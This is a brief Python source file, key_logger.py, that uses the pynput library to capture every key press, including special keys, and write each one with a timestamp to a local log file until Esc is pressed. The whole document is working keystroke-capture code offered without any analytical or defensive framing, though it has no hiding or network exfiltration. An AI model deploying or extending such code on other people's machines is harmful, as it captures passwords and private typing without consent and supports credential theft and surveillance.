# key_logger.py

import logging
from pynput.keyboard import Key, Listener

# Set up logging
logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    """Log key press event"""
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    """Log key release event"""
    if key == Key.esc:
        # Stop listener
        return False

# Create listener
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()